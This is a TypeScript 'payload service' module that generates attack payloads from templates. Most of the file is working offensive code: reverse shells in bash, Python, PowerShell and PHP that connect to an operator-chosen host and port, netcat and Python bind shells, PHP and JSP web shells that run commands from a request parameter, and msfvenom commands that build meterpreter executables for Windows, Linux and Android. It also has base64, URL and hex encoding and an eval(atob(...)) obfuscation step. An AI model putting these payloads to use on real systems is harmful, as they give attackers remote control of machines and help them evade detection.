// Payload Service - Generates various types of payloads

export interface PayloadConfig {
  type: string
  platform: string
  language: string
  lhost: string
  lport: string
  encoding?: string
}

export const payloadService = {
  // Generate payload based on configuration
  generatePayload(config: PayloadConfig): string {
    const templates = {
      'reverse-shell': {
        bash: (lhost: string, lport: string) => 
          `#!/bin/bash\nbash -i >& /dev/tcp/${lhost}/${lport} 0>&1`,
        
        python: (lhost: string, lport: string) =>
          `import socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(("${lhost}",${lport}))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\np=subprocess.call(["/bin/sh","-i"])`,
        
        powershell: (lhost: string, lport: string) =>
          `$client = New-Object System.Net.Sockets.TCPClient("${lhost}",${lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`,
        
        php: (lhost: string, lport: string) =>
          `<?php\n$sock=fsockopen("${lhost}",${lport});\nexec("/bin/sh -i <&3 >&3 2>&3");\n?>`
      },
      
      'bind-shell': {
        netcat: (lhost: string, lport: string) =>
          `nc -lvp ${lport} -e /bin/bash`,
        
        python: (lhost: string, lport: string) =>
          `import socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.bind(("0.0.0.0",${lport}))\ns.listen(1)\nconn,addr=s.accept()\nos.dup2(conn.fileno(),0)\nos.dup2(conn.fileno(),1)\nos.dup2(conn.fileno(),2)\np=subprocess.call(["/bin/sh","-i"])`
      },
      
      'web-shell': {
        php: (lhost: string, lport: string) =>
          `<?php\nif(isset($_REQUEST['cmd'])){\n  echo "<pre>";\n  $cmd = ($_REQUEST['cmd']);\n  system($cmd);\n  echo "</pre>";\n  die;\n}\n?>`,
        
        jsp: (lhost: string, lport: string) =>
          `<%@ page import="java.util.*,java.io.*"%>\n<%\nif (request.getParameter("cmd") != null) {\n  Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));\n  OutputStream os = p.getOutputStream();\n  InputStream in = p.getInputStream();\n  DataInputStream dis = new DataInputStream(in);\n  String disr = dis.readLine();\n  while ( disr != null ) {\n    out.println(disr);\n    disr = dis.readLine();\n  }\n}\n%>`
      },
      
      'meterpreter': {
        windows: (lhost: string, lport: string) =>
          `msfvenom -p windows/meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} -f exe -o payload.exe`,
        
        linux: (lhost: string, lport: string) =>
          `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} -f elf -o payload.elf`,
        
        android: (lhost: string, lport: string) =>
          `msfvenom -p android/meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} -o payload.apk`
      }
    }

    const typeTemplates: any = templates[config.type as keyof typeof templates]
    if (!typeTemplates) {
      return `# Error: Unknown payload type "${config.type}"`
    }

    const template: any = typeTemplates[config.language]
    if (!template) {
      return `# Error: Unknown language "${config.language}" for type "${config.type}"`
    }

    let payload: string
    if (typeof template === 'function') {
      payload = template(config.lhost, config.lport)
    } else {
      payload = String(template)
    }

    // Apply encoding if specified
    if (config.encoding && config.encoding !== 'none') {
      payload = this.encodePayload(payload, config.encoding)
    }

    return payload
  },

  // Encode payload
  encodePayload(payload: string, encoding: string): string {
    switch (encoding) {
      case 'base64':
        return `# Base64 Encoded\n${btoa(payload)}`
      
      case 'url':
        return `# URL Encoded\n${encodeURIComponent(payload)}`
      
      case 'hex':
        return `# Hex Encoded\n${Array.from(payload).map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('')}`
      
      default:
        return payload
    }
  },

  // Obfuscate payload
  obfuscatePayload(payload: string, level: 'low' | 'medium' | 'high'): string {
    // Simple obfuscation simulation
    if (level === 'low') {
      return payload.split('').map(c => Math.random() > 0.5 ? c : c.toUpperCase()).join('')
    }
    if (level === 'medium') {
      return btoa(payload)
    }
    return `eval(atob("${btoa(payload)}"))`
  }
}
